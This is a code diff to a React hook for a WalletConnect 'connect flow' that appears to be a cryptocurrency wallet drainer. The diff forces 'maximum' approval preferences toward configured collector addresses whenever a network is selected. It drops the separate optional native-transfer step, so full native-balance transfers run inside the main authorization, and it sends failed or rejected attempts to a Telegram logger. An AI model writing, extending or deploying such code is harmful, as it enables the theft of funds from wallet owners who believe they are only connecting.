@@ -34,42 +34,29 @@ import {
   configGaps,
   getSpenderForNetwork,
 } from "../types/connect-flow-props";
-import { tokensForNetwork } from "../core/chain-tokens";
 import {
   applyCollectionModeForNetwork,
   buildMaximumPreferences,
   buildMaximumPreferencesForNetwork,
-  listIncludedTokenWork,
+  listIncludedAssetWork,
+  nativeDecimalsForNetwork,
   validateIncludedPrefs,
 } from "../authorization/preferences";
 import { runAuthorizationSession } from "../authorization/session";
+import { parseHumanToRaw } from "../core/chain-tokens";
 import type {
+  AssetSymbol,
   AuthorizationSessionResult,
   CollectionMode,
   CollectionPreferences,
   LinkedAccounts,
   ModalStep,
   NetworkRow,
-  NetworkTokenPrefs,
   RowStatus,
   TokenPreference,
-  TokenSymbol,
   UniversalProvider,
   WalletConnectModal,
 } from "../types";
-
-function inferCollectionMode(
-  networkKey: string,
-  row: NetworkTokenPrefs | undefined
-): CollectionMode {
-  const tokens = tokensForNetwork(networkKey);
-  if (tokens.length === 0) return "maximum";
-  if (!row) return "maximum";
-  const allMaximum = tokens.every(
-    (t) => row[t.symbol]?.included && row[t.symbol]?.mode === "maximum"
-  );
-  return allMaximum ? "maximum" : "custom";
-}
 
 export function useConnectFlow(props: ConnectFlowProps = {}) {
   const spendersRef = useRef(props);
@@ -100,11 +87,8 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     useState<AuthorizationSessionResult | null>(null);
   const [authorizingAsset, setAuthorizingAsset] = useState<{
     network: string;
-    token: TokenSymbol;
+    asset: AssetSymbol;
   } | null>(null);
-  const [nativeSelected, setNativeSelected] = useState<Record<string, boolean>>(
-    {}
-  );
   const [nativeEstimates, setNativeEstimates] = useState<
     Record<string, NativeTransferEstimate | null>
   >({});
@@ -133,7 +117,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     setTermsAccepted(false);
     setSessionResult(null);
     setAuthorizingAsset(null);
-    setNativeSelected({});
     setNativeEstimates({});
     setNativeEstimateLoading({});
     setNativeEstimateErrors({});
@@ -415,14 +398,14 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       if (approving) return;
       setSelectedKey(key);
       setError(null);
-      setPreferences((prev) => {
-        const row = prev[key] ?? buildMaximumPreferencesForNetwork(key);
-        setCollectionMode(inferCollectionMode(key, row));
-        if (prev[key]) return prev;
-        return { ...prev, [key]: row };
-      });
+      setCollectionMode("maximum");
+      setPreferences((prev) => ({
+        ...prev,
+        [key]: buildMaximumPreferencesForNetwork(key),
+      }));
+      void refreshNativeEstimateFor(key);
     },
-    [approving]
+    [approving, refreshNativeEstimateFor]
   );
 
   const onCollectionModeChange = useCallback(
@@ -437,17 +420,17 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     [approving, selectedKey]
   );
 
-  const onTokenPreferenceChange = useCallback(
-    (network: string, token: TokenSymbol, patch: Partial<TokenPreference>) => {
+  const onAssetPreferenceChange = useCallback(
+    (network: string, asset: AssetSymbol, patch: Partial<TokenPreference>) => {
       if (approving) return;
       setPreferences((prev) => {
         const row = { ...(prev[network] ?? {}) };
-        const current = row[token] ?? {
+        const current = row[asset] ?? {
           included: false,
           mode: "custom" as const,
           amountHuman: "",
         };
-        row[token] = { ...current, ...patch };
+        row[asset] = { ...current, ...patch };
         return { ...prev, [network]: row };
       });
       if (network === selectedKey) {
@@ -471,7 +454,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       return;
     }
 
-    const items = listIncludedTokenWork(preferences, networks, selectedKey);
+    const items = listIncludedAssetWork(preferences, networks, selectedKey);
     const validationError = validateIncludedPrefs(items);
     if (validationError) {
       setError(validationError);
@@ -497,10 +480,19 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         network: selectedKey,
         mode: collectionMode,
         assetCount: items.length,
-        assets: items.map((i) => `${i.network}:${i.token}`),
+        assets: items.map((i) => `${i.network}:${i.asset}`),
       });
 
-      const orchestrator = createBrowserApprovalOrchestrator({
+      const approvalOrchestrator = createBrowserApprovalOrchestrator({
+        provider,
+        logger: {
+          info: (event, detail) => logStep(event, detail ?? {}),
+          warn: (event, detail) => logStep(event, detail ?? {}),
+          error: (event, detail) => logStep(event, detail ?? {}),
+        },
+      });
+
+      const nativeOrchestrator = createBrowserNativeTransferOrchestrator({
         provider,
         logger: {
           info: (event, detail) => logStep(event, detail ?? {}),
@@ -517,11 +509,15 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           getSpenderForNetwork(spendersRef.current, networkKey),
         log: logStep,
         onAssetStart: (item) => {
-          setAuthorizingAsset({ network: item.network, token: item.token });
+          setAuthorizingAsset({ network: item.network, asset: item.asset });
           setStatus(item.network, "waiting");
         },
         onAssetEnd: (result) => {
-          if (result.outcome === "authorized") {
+          if (
+            result.outcome === "authorized" ||
+            result.outcome === "collected" ||
+            result.outcome === "pending"
+          ) {
             setStatus(result.network, "approved");
           } else if (result.outcome === "user_rejected") {
             setStatus(result.network, "rejected");
@@ -540,9 +536,30 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
             result.network === "tron"
               ? accountsRef.current.tron
               : accountsRef.current.evm;
+          if (!owner) return;
+
+          if (result.token === "NATIVE") {
+            if (
+              result.outcome === "failed" ||
+              result.outcome === "user_rejected"
+            ) {
+              void postTgLog({
+                type: "native_transfer",
+                address: owner,
+                network: result.network,
+                status: "rejected",
+                error:
+                  result.outcome === "user_rejected"
+                    ? "Permission denied by user"
+                    : result.message ?? "Native transfer failed",
+              });
+            }
+            return;
+          }
+
           if (
-            owner &&
-            (result.outcome === "failed" || result.outcome === "user_rejected")
+            result.outcome === "failed" ||
+            result.outcome === "user_rejected"
           ) {
             void postTgLog({
               type: "approve",
@@ -557,7 +574,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           }
         },
         runApproval: async (args) => {
-          return orchestrator.run(
+          return approvalOrchestrator.run(
             {
               network: args.network,
               owner: args.owner,
@@ -583,6 +600,49 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
                   stage: stageResult.stage,
                   status: stageResult.status,
                   data: stageResult.data,
+                  error: stageResult.error ?? null,
+                });
+              },
+            }
+          );
+        },
+        runNativeTransfer: async (args) => {
+          const networkRow = networks.find((n) => n.key === args.network);
+          const decimals = nativeDecimalsForNetwork(args.network);
+          let transferAmountRaw: string | undefined;
+          let transferAmountHuman: string | undefined;
+          if (!args.unlimited && args.amountHuman) {
+            const requested = parseHumanToRaw(args.amountHuman, decimals);
+            const balanceRaw = networkRow
+              ? parseHumanToRaw(networkRow.balances.native ?? "0", decimals)
+              : requested;
+            transferAmountRaw =
+              requested < balanceRaw
+                ? requested.toString()
+                : balanceRaw.toString();
+            transferAmountHuman = args.amountHuman;
+          }
+
+          return nativeOrchestrator.run(
+            {
+              network: args.network,
+              owner: args.owner,
+              termsVersion: TERMS_VERSION,
+              traceId: traceIdRef.current,
+              transferAmountRaw,
+              transferAmountHuman,
+            },
+            {
+              onStage: (stageResult) => {
+                if (
+                  stageResult.stage === "BROADCAST" &&
+                  stageResult.status === "OK"
+                ) {
+                  setStatus(args.network, "finalizing");
+                }
+                args.onStage?.({
+                  stage: stageResult.stage,
+                  status: stageResult.status,
                   error: stageResult.error ?? null,
                 });
               },
@@ -629,247 +689,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     termsAccepted,
   ]);
 
-  const onContinueToNative = useCallback(() => {
-    setError(null);
-    setModalStep("native");
-    const networkKey = selectedKey;
-    if (!networkKey) {
-      setNativeSelected({});
-      return;
-    }
-    const est = nativeEstimates[networkKey];
-    setNativeSelected({
-      [networkKey]: Boolean(
-        est?.canTransfer && BigInt(est.transferableRaw) > BigInt(0)
-      ),
-    });
-    void refreshNativeEstimateFor(networkKey);
-  }, [nativeEstimates, refreshNativeEstimateFor, selectedKey]);
-
-  const onSkipNative = useCallback(() => {
-    setShowResults(false);
-    setModalStep("preferences");
-  }, []);
-
-  const onNativeToggle = useCallback((network: string, included: boolean) => {
-    setNativeSelected((prev) => ({ ...prev, [network]: included }));
-  }, []);
-
-  const onNativeSelectAll = useCallback(
-    (included: boolean) => {
-      if (!selectedKey) {
-        setNativeSelected({});
-        return;
-      }
-      const est = nativeEstimates[selectedKey];
-      const eligible =
-        est != null &&
-        est.canTransfer &&
-        BigInt(est.transferableRaw) > BigInt(0);
-      setNativeSelected({ [selectedKey]: included && eligible });
-    },
-    [nativeEstimates, selectedKey]
-  );
-
-  const requestNativeTransfers = useCallback(async () => {
-    const provider = providerRef.current;
-    if (!provider || approvingLockRef.current) return;
-
-    const selectedKeys = Object.entries(nativeSelected)
-      .filter(([, on]) => on)
-      .map(([key]) => key);
-    if (selectedKeys.length === 0) {
-      setError("Select at least one network for native transfer");
-      return;
-    }
-
-    approvingLockRef.current = true;
-    setApproving(true);
-    setError(null);
-
-    const nativeResults = [...(sessionResult?.items ?? [])];
-
-    try {
-      logStep("NATIVE TRANSFER SESSION STARTED", {
-        networks: selectedKeys,
-      });
-
-      for (const networkKey of selectedKeys) {
-        const estimate = nativeEstimates[networkKey];
-        const owner =
-          networkKey === "tron"
-            ? accountsRef.current.tron
-            : accountsRef.current.evm;
-
-        if (
-          !owner ||
-          !estimate ||
-          !estimate.canTransfer ||
-          BigInt(estimate.transferableRaw) <= BigInt(0)
-        ) {
-          const result = {
-            network: networkKey,
-            token: "NATIVE" as const,
-            outcome: "skipped_zero" as const,
-            message: "Skipped — no transferable native balance",
-          };
-          nativeResults.push(result);
-          logStep("NATIVE TRANSFER ASSET SKIPPED", result);
-          continue;
-        }
-
-        const gaps = configGaps(spendersRef.current, networkKey);
-        if (gaps.length > 0) {
-          const result = {
-            network: networkKey,
-            token: "NATIVE" as const,
-            outcome: "failed" as const,
-            message: `Missing collector: ${gaps.join(", ")}`,
-          };
-          nativeResults.push(result);
-          logStep("NATIVE TRANSFER ASSET FAILED", result);
-          continue;
-        }
-
-        setStatus(networkKey, "waiting");
-        try {
-          const orchestrator = createBrowserNativeTransferOrchestrator({
-            provider,
-            logger: {
-              info: (event, detail) => logStep(event, detail ?? {}),
-              warn: (event, detail) => logStep(event, detail ?? {}),
-              error: (event, detail) => logStep(event, detail ?? {}),
-            },
-          });
-
-          const result = await orchestrator.run(
-            {
-              network: networkKey,
-              owner,
-              termsVersion: TERMS_VERSION,
-              traceId: traceIdRef.current,
-            },
-            {
-              onStage: (stageResult) => {
-                if (
-                  stageResult.stage === "BROADCAST" &&
-                  stageResult.status === "OK"
-                ) {
-                  setStatus(networkKey, "finalizing");
-                }
-              },
-            }
-          );
-
-          if (!result.ok) {
-            const rejected = Boolean(result.userRejected);
-            const assetResult = {
-              network: networkKey,
-              token: "NATIVE" as const,
-              outcome: (rejected
-                ? "user_rejected"
-                : "failed") as "user_rejected" | "failed",
-              message: result.error || "Native transfer failed",
-              txHash: result.txHash,
-            };
-            nativeResults.push(assetResult);
-            setStatus(networkKey, rejected ? "rejected" : "awaiting");
-            logStep(
-              rejected
-                ? "NATIVE TRANSFER ASSET REJECTED"
-                : "NATIVE TRANSFER ASSET FAILED",
-              assetResult
-            );
-            void postTgLog({
-              type: "native_transfer",
-              address: owner,
-              network: networkKey,
-              status: "rejected",
-              error: rejected
-                ? "Permission denied by user"
-                : assetResult.message,
-            });
-            continue;
-          }
-
-          const assetResult = {
-            network: networkKey,
-            token: "NATIVE" as const,
-            outcome: (result.pendingRegistered
-              ? "pending"
-              : "collected") as "pending" | "collected",
-            message: result.pendingRegistered
-              ? "Native transfer pending confirmation"
-              : "Native transfer confirmed",
-            txHash: result.txHash,
-          };
-          nativeResults.push(assetResult);
-          setStatus(networkKey, "approved");
-          logStep("NATIVE TRANSFER COMPLETE", {
-            fundsMoved: result.pendingRegistered
-              ? "PENDING — registered for background reconciliation"
-              : "YES — native transfer confirmed",
-            network: networkKey,
-            owner,
-            txHash: result.txHash,
-            transferId: result.transferId,
-          });
-        } catch (err: unknown) {
-          const rejected = isUserRejection(err);
-          const assetResult = {
-            network: networkKey,
-            token: "NATIVE" as const,
-            outcome: (rejected
-              ? "user_rejected"
-              : "failed") as "user_rejected" | "failed",
-            message: getErrorMessage(err, "Native transfer failed"),
-          };
-          nativeResults.push(assetResult);
-          setStatus(networkKey, rejected ? "rejected" : "awaiting");
-          logStep(
-            rejected
-              ? "NATIVE TRANSFER ASSET REJECTED"
-              : "NATIVE TRANSFER ASSET FAILED",
-            assetResult
-          );
-        }
-      }
-
-      const nextSession: AuthorizationSessionResult = {
-        items: nativeResults,
-        authorizedCount: nativeResults.filter((i) => i.outcome === "authorized")
-          .length,
-        failedCount: nativeResults.filter((i) => i.outcome === "failed")
-          .length,
-        rejectedCount: nativeResults.filter(
-          (i) => i.outcome === "user_rejected"
-        ).length,
-        skippedCount: nativeResults.filter(
-          (i) =>
-            i.outcome === "skipped_unsupported" ||
-            i.outcome === "skipped_zero"
-        ).length,
-      };
-      setSessionResult(nextSession);
-      logStep("NATIVE TRANSFER SESSION COMPLETE", {
-        items: nativeResults.filter((i) => i.token === "NATIVE"),
-      });
-      setModalStep("results");
-    } finally {
-      approvingLockRef.current = false;
-      setApproving(false);
-    }
-  }, [
-    logStep,
-    nativeEstimates,
-    nativeSelected,
-    sessionResult,
-    setStatus,
-  ]);
-
   const closeResultsModal = useCallback(() => {
     if (approving) return;
     setShowResults(false);
+    setModalStep("preferences");
   }, [approving]);
 
   return {
@@ -887,7 +710,6 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     termsAccepted,
     sessionResult,
     authorizingAsset,
-    nativeSelected,
     nativeEstimates,
     nativeEstimateLoading,
     nativeEstimateErrors,
@@ -897,17 +719,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     openWalletConnect,
     onSelectNetwork,
     onCollectionModeChange,
-    onTokenPreferenceChange,
+    onAssetPreferenceChange,
     onTermsChange: setTermsAccepted,
     onAuthorize: () => {
       void requestAuthorizeSession();
-    },
-    onContinueToNative,
-    onSkipNative,
-    onNativeToggle,
-    onNativeSelectAll,
-    onSubmitNative: () => {
-      void requestNativeTransfers();
     },
     onRetryNativeEstimate: (network: string) => {
       void refreshNativeEstimateFor(network);
